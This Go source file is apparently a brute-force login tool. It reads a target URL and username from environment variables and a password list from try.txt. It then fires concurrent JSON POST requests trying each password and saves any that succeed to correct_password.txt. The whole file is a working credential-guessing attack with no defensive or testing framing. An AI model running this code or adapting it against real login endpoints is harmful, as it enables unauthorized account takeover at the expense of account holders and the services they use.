package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
)

type RequestBody struct {
	UserLogin    string `json:"user_login"`
	UserPassword string `json:"user_password"`
}

type Handler struct {
	url      string
	BodyData RequestBody
}

func RandStringRunes(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func WriteOrAppendFile(filename string, pw string) error {
	f, err := os.OpenFile(filename,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	defer func(f *os.File) {
		err := f.Close()
		if err != nil {

		}
	}(f)
	if _, err := f.WriteString(pw + "\n"); err != nil {
		log.Println(err)
	}
	return nil
}

func main() {
	for i := 0; i < 100; i++ {
		s := RandStringRunes(11)
		err := WriteOrAppendFile("wrong_password.txt", s)
		if err != nil {
			return
		}
	}

	//godotenv.Load() requires env file

	url := os.Getenv("URL")
	username := os.Getenv("USERNAME")

	reqBody := RequestBody{
		UserLogin: username,
	}

	h := Handler{
		url:      url,
		BodyData: reqBody,
	}

	content, err := ioutil.ReadFile("try.txt")
	if err != nil {
		log.Println(err)
	}
	pwLines := strings.Split(string(content), "\n")

	_, err = h.AsyncHTTP(pwLines)

	if err != nil {
		log.Println(err)
	}
}

func (h Handler) TryPassword(pws []string) error {

	for _, pw := range pws {
		h.BodyData.UserPassword = pw
		j, err := json.Marshal(h.BodyData)

		if err != nil {
			log.Println("error marshaling body:", err.Error())
		}

		req, _ := http.NewRequest("POST", h.url, bytes.NewBuffer(j))

		req.Header.Set("X-Custom-Header", "myvalue")
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		defer func(Body io.ReadCloser) {
			err := Body.Close()
			if err != nil {

			}
		}(resp.Body)

		var result map[string]interface{}

		body, _ := ioutil.ReadAll(resp.Body)
		_ = json.Unmarshal(body, &result)

		if result["status"] == "success" {
			fmt.Println("Correct password ✅:", pw)
			_ = os.WriteFile("correct_password.txt", []byte(pw), 0644)
			continue
		} else {
			fmt.Println("Wrong password ❌:", pw)
			_ = WriteOrAppendFile("wrong_password.txt", pw)
			continue
		}

	}
	return nil
}

func (h Handler) AsyncHTTP(pws []string) ([]string, error) {
	ch := make(chan string)
	var responses []string
	var wg sync.WaitGroup

	for _, pw := range pws {
		wg.Add(1)
		go h.sendUser(pw, ch, &wg)
	}

	// close the channel in the background
	go func() {
		wg.Wait()
		close(ch)
	}()
	// read from channel as they come in until its closed
	for res := range ch {
		responses = append(responses, res)
	}

	return responses, nil
}

func (h Handler) sendUser(pw string, ch chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()

	h.BodyData.UserPassword = pw
	j, _ := json.Marshal(h.BodyData)

	req, _ := http.NewRequest("POST", h.url, bytes.NewBuffer(j))

	req.Header.Set("X-Custom-Header", "myvalue")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		ch <- "error"
		return
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {

		}
	}(resp.Body)

	var result map[string]interface{}

	body, _ := ioutil.ReadAll(resp.Body)
	_ = json.Unmarshal(body, &result)

	if result["status"] == "success" {
		fmt.Println("Correct password ✅:", pw)
		_ = os.WriteFile("correct_password.txt", []byte(pw), 0644)
	} else {
		fmt.Println("Wrong password ❌:", pw)
		_ = WriteOrAppendFile("wrong_password.txt", pw)
	}

	ch <- string(body)
}
